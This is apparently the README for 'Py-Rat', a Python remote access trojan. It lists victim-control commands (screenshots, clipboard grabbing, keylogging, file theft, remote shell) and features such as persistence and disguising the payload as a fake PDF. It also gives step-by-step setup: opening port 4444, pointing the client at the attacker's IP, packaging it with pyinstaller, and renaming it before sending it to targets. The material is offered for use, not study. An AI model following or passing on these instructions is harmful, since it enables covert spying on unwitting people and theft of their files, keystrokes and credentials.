Py-Rat

Usage: 
Main Menu:
- list : List all victims
- select 'id' : select victim
- shutdown : close receiver
- help : show help Menu
Remote Shell:
- screenshot : Get victim's screenshot
- get_clipboard : Get victim's clipboard
- send_keystroke 'string' : Send keystroke to victim
- keylogger : Open keylogger logs
- download 'file' : Download file from victim's pc
- quit : close victim


Features:

- Screenshot
- Download files
- Persistence (Auto connect to server)
- Remote Shell
- Get Clipboard
- Keystroke Injection
- Port Forwarding Required
- Source Code
- Python 
- Hidden as Fake PDF

P:1200

How to setup:

- Install Python 3 (https://www.youtube.com/watch?v=UvcQlPZ8ecA)
- Enable Portforwarding on your router or in your vps/rdp Ports: 4444, 21 (https://www.youtube.com/watch?v=jfSLxs40sIw) 
- Open cmd
- type 'pip install pyinstaller'
- type 'pip install pyautogui'
- type 'pip install datetime'
- Edit the client.pyw and change the 'self.serverHost' to your public ip
- Locate your client.pyw file in cmd then type 'pyinstaller -F client.py -i favicon.ico --hidden-import "pynput.keyboard._win32" --hidden-import "pynput.mouse._win32"'
- Open dist folder and send your payload! you can rename it so that it will look less obvious
- Open the server file and wait for connections 

